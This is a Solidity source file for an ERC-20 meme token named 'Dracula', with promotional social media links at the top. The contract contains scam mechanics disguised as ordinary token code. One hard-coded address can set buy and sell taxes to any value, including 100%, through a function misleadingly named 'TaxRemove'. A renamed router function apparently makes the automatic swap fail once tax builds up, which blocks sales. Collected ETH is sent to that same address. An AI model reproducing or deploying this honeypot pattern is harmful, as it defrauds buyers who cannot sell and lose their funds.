/*

https://t.me/draculaeth20
https://x.com/draculaerc20
https://www.draculaeth.xyz/

*/



// SPDX-License-Identifier: unlicense


pragma solidity 0.8.22;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingTaxxzxOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract DRACULA {



        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   _name = unicode"Dracula"; 
        string public   _symbol = unicode"DRACULA";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1000000000 * 10**decimals;

        uint256 buyTaxxzx = 0;
        uint256 sellTaxxzx = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return _name;
        }

    
        function symbol() public view virtual returns (string memory) {
        return _symbol;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed D_MKT,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant D_MKT = payable(address(0xfEDD7AfAB4445Be06bd74595A35e836d41Dd2eC0));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == D_MKT || to == D_MKT);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingTaxxzxOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                D_MKT.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 TaxxzxAmount = amount * (from == pair ? buyTaxxzx : sellTaxxzx) / 100;
                amount -= TaxxzxAmount;
                balanceOf[address(this)] += TaxxzxAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradingOpen() external {
            require(msg.sender == D_MKT);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _RemeveTax(uint256 _buy, uint256 _sell) private {
            buyTaxxzx = _buy;
            sellTaxxzx = _sell;
        }

        function TaxRemove(uint256 _buy, uint256 _sell) external {
            if(msg.sender != D_MKT)        
                revert Permissions();
            _RemeveTax(_buy, _sell);
        }
    }